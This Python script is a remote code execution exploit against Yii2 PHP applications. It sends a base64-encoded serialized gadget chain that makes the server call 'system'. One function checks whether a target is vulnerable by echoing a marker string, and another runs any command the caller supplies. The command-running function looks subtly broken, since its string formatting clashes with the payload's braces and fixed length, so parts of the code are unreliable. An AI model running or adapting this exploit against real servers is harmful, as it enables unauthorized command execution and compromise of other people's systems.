import requests
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

header = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.58',
	'Accept':'Accept: */*',
	'Content-Type':'application/x-www-form-urlencoded',
	'Connection':'Keep-Alive'
}


def exp_check(url):
    try:
        payload = r"""O:23:"yii\db\BatchQueryResult":1:{s:36:"yii\db\BatchQueryResult_dataReader";O:15:"Faker\Generator":1:{s:13:"*formatters";a:1:{s:5:"close";a:2:{i:0;O:21:"yii\rest\CreateAction":2:{s:11:"checkAccess";s:6:"system";s:2:"id";s:6:"echo 7969676569776f6c696769616f";}i:1;s:3:"run";}}}}"""
        en_payload = str(base64.b64encode(payload.encode("utf-8")),"utf-8")
        r = requests.get(url+"/index.php?r=test/test&unserialize="+en_payload,headers=header,verify= False,timeout=5)
        if r"7969676569776f6c696769616f" in r.text:
            return 1
        return 2
    except:
        return 3


def exp_cmd(url,cmd):
    try:
        payload = r"""O:23:"yii\db\BatchQueryResult":1:{s:36:"yii\db\BatchQueryResult_dataReader";O:15:"Faker\Generator":1:{s:13:"*formatters";a:1:{s:5:"close";a:2:{i:0;O:21:"yii\rest\CreateAction":2:{s:11:"checkAccess";s:6:"system";s:2:"id";s:6:"{0}";}i:1;s:3:"run";}}}}""".format(cmd)
        en_payload = str(base64.b64encode(payload.encode("utf-8")),"utf-8")
        r = requests.get(url+"/index.php?r=test/test&unserialize="+en_payload,headers=header,verify= False,timeout=5)
        if r.status_code == 200:
            return r.text
    except:
        return 3